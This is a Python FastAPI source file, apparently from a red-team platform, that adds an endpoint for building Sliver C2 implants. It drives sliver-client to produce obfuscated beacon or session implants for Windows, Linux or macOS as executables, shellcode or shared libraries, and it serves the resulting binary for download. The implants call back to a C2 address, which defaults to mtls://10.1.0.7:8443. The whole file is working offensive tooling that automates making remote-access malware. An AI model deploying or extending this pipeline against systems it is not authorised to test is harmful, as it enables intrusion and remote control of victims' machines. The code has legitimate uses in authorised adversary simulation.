"""Sliver-native implant generation route.

This is the path Phase 4 settled on: shell out to `sliver-client --rc <file>`
with a generated rc-script that runs the `generate` (or `generate beacon`)
console command. The server-side build pipeline does the cert injection the
sliver-py `generate_implant` RPC skips, so the resulting binary actually
completes mTLS handshake and registers a session/beacon.

Why not pexpect: it's a new dep, and the `--rc` flag gives us a non-
interactive entry point that handles the readline/CPR dance for free.
Why not sliver-server generate: that subcommand doesn't exist on the server
binary as of v1.7.4 — only the *client* console knows how to generate.
"""
from __future__ import annotations

import asyncio
import logging
import re
import shlex
import shutil
import tempfile
from pathlib import Path
from typing import Literal
from urllib.parse import urlparse

from fastapi import APIRouter, HTTPException
from fastapi.responses import FileResponse
from pydantic import BaseModel, Field

log = logging.getLogger(__name__)
router = APIRouter(prefix="/api/build/sliver", tags=["build-sliver"])

# Build pipeline can take 30-90 s on cold cache; cap at 300.
_BUILD_TIMEOUT_S = 300

_VALID_GOOS = ("windows", "linux", "darwin")
_VALID_GOARCH = ("amd64", "386", "arm64")
_VALID_FORMAT = ("exe", "shellcode", "shared-lib")
_VALID_C2_SCHEME = {"mtls", "http", "https", "dns", "wg"}

# Sliver's `generate` flag uses "shared" rather than "shared-lib".
_FORMAT_TO_SLIVER = {"exe": "exe", "shellcode": "shellcode", "shared-lib": "shared"}


class BuildSliverRequest(BaseModel):
    goos: Literal["windows", "linux", "darwin"]
    goarch: Literal["amd64", "386", "arm64"]
    format: Literal["exe", "shellcode", "shared-lib"]
    c2_url: str = Field(..., description="e.g. mtls://10.1.0.7:8443")
    name: str | None = None
    beacon: bool = True
    beacon_interval_s: int | None = None
    obfuscate: bool = True


class BuildSliverOptions(BaseModel):
    goos: list[str]
    goarch: list[str]
    format: list[str]
    defaults: dict


# ── helpers ────────────────────────────────────────────────────────

def _parse_c2(raw: str) -> tuple[str, str]:
    """Return (scheme, hostpart) — hostpart is what sliver's --mtls/--http/
    etc. flags want (no scheme). Raises 400 on malformed input."""
    raw = (raw or "").strip()
    if not raw:
        raise HTTPException(status_code=400, detail="c2_url is required")
    parsed = urlparse(raw)
    scheme = (parsed.scheme or "").lower()
    if scheme not in _VALID_C2_SCHEME:
        raise HTTPException(
            status_code=400,
            detail=f"c2_url scheme must be one of {sorted(_VALID_C2_SCHEME)}",
        )
    # netloc carries host[:port]; if scheme is dns it's a domain.
    host = parsed.netloc or parsed.path
    if not host:
        raise HTTPException(status_code=400, detail="c2_url is missing a host")
    return scheme, host


def _build_generate_command(req: BuildSliverRequest) -> str:
    """Translate a request into a single sliver-console `generate` line.
    Returns the unescaped command string (caller writes it to the rc file
    verbatim)."""
    scheme, host = _parse_c2(req.c2_url)
    parts: list[str] = ["generate"]
    if req.beacon:
        parts.append("beacon")

    parts += ["--os", req.goos, "--arch", req.goarch]
    parts += ["--format", _FORMAT_TO_SLIVER[req.format]]

    # C2 flags — sliver uses one flag per protocol.
    if scheme == "mtls":
        parts += ["--mtls", host]
    elif scheme == "http" or scheme == "https":
        # sliver --http accepts "host:port" or full URL; pass full URL so
        # the scheme (https vs http) is preserved.
        parts += ["--http", req.c2_url]
    elif scheme == "dns":
        parts += ["--dns", host]
    elif scheme == "wg":
        parts += ["--wg", host]

    if req.name:
        # Defensive: only allow [A-Za-z0-9_-] in names. Anything else is
        # rejected before we let it near a shell-ish command line.
        if not re.fullmatch(r"[A-Za-z0-9_-]+", req.name):
            raise HTTPException(
                status_code=400,
                detail="name must match [A-Za-z0-9_-]",
            )
        parts += ["--name", req.name]

    if req.beacon and req.beacon_interval_s is not None:
        if req.beacon_interval_s <= 0:
            raise HTTPException(status_code=400, detail="beacon_interval_s must be > 0")
        parts += ["--seconds", str(req.beacon_interval_s)]

    if not req.obfuscate:
        # Default behaviour obfuscates symbols; opt out explicitly.
        parts.append("--skip-symbols")

    return " ".join(shlex.quote(p) for p in parts)


def _expected_ext(req: BuildSliverRequest) -> str:
    """Best-guess file extension the sliver build will use. Used only for
    the download Content-Disposition; the actual file name we serve comes
    from the on-disk artifact."""
    fmt = req.format
    if fmt == "shellcode":
        return ".bin"
    if fmt == "shared-lib":
        return {"windows": ".dll", "linux": ".so", "darwin": ".dylib"}[req.goos]
    # exe
    return ".exe" if req.goos == "windows" else ""


def _build_rc_script(generate_cmd: str) -> str:
    return f"{generate_cmd}\nexit\n"


# ── runner (factored out for tests) ────────────────────────────────

async def _run_sliver_client(rc_path: Path) -> tuple[int, str, str]:
    """Spawn `sliver-client --rc <rc_path>` with a 300 s wall-clock cap.
    Returns (exit_code, stdout, stderr). Raises HTTPException(504) on
    timeout, HTTPException(500) on spawn failure."""
    try:
        proc = await asyncio.create_subprocess_exec(
            "sliver-client", "--rc", str(rc_path),
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
    except Exception as e:  # noqa: BLE001
        raise HTTPException(status_code=500, detail=f"failed to spawn sliver-client: {e}")

    try:
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=_BUILD_TIMEOUT_S)
    except asyncio.TimeoutError:
        proc.kill()
        raise HTTPException(
            status_code=504,
            detail=f"sliver build exceeded {_BUILD_TIMEOUT_S}s timeout",
        )

    return proc.returncode or 0, stdout.decode("utf-8", "replace"), stderr.decode("utf-8", "replace")


def _strip_ansi(s: str) -> str:
    """sliver-client peppers its output with spinner control sequences. Strip
    CSI codes for cleaner error reporting and exit-detection."""
    return re.sub(r"\x1b\[[0-9;]*[A-Za-z]", "", s)


# ── routes ─────────────────────────────────────────────────────────

@router.get("/options", response_model=BuildSliverOptions)
async def get_options() -> BuildSliverOptions:
    return BuildSliverOptions(
        goos=list(_VALID_GOOS),
        goarch=list(_VALID_GOARCH),
        format=list(_VALID_FORMAT),
        defaults={
            "goos": "windows",
            "goarch": "amd64",
            "format": "exe",
            "beacon": True,
            "beacon_interval_s": 60,
            "obfuscate": True,
            "c2_url": "mtls://10.1.0.7:8443",
        },
    )


@router.post("")
async def build_sliver(req: BuildSliverRequest):
    # Build command first so validation errors short-circuit before any
    # disk activity.
    generate_cmd = _build_generate_command(req)

    work = Path(tempfile.mkdtemp(prefix="build-sliver-", dir="/tmp"))
    rc_path = work / "rc"
    save_dir = work / "out"
    save_dir.mkdir(parents=True, exist_ok=True)
    rc_path.write_text(_build_rc_script(f"{generate_cmd} --save {shlex.quote(str(save_dir))}"))

    log.info("sliver build start: %s", generate_cmd)
    code, stdout, stderr = await _run_sliver_client(rc_path)
    cleaned = _strip_ansi(stdout + "\n" + stderr)

    # Detect failure — sliver-client returns 0 even when generate errors,
    # so we scan the output for known failure markers and the absence of
    # a "Build completed" line. If output references "Implant saved to",
    # extract that path as a fallback when scandir misses the file.
    saved_match = re.search(r"Implant saved to\s+(\S+)", cleaned)
    success_marker = "Build completed" in cleaned or saved_match is not None
    if code != 0 or not success_marker:
        shutil.rmtree(work, ignore_errors=True)
        raise HTTPException(
            status_code=422,
            detail=f"sliver-client failed (exit {code}):\n{cleaned[-2000:]}",
        )

    # Find the produced artifact. Prefer scanning save_dir; fall back to
    # the explicit path the console reported if scandir misses (e.g. it
    # saved into the cwd because --save was overridden somehow).
    candidates = sorted(p for p in save_dir.iterdir() if p.is_file())
    if not candidates and saved_match:
        p = Path(saved_match.group(1))
        if p.is_file():
            candidates = [p]
    if not candidates:
        shutil.rmtree(work, ignore_errors=True)
        raise HTTPException(
            status_code=422,
            detail=f"sliver-client succeeded but produced no output file:\n{cleaned[-2000:]}",
        )
    artifact = candidates[0]
    filename = artifact.name
    # Ensure the extension matches what we promised (best-effort: sliver's
    # auto-naming usually appends the right one).
    if "." not in filename:
        filename += _expected_ext(req)

    # FileResponse will stream the bytes; we let it manage the open fd.
    # The temp dir persists until OS cleanup — small enough not to bother
    # tracking. (For production we'd want a background broom.)
    return FileResponse(
        path=str(artifact),
        media_type="application/octet-stream",
        filename=filename,
        headers={"X-Sliver-Build-Command": generate_cmd[:1024]},
    )
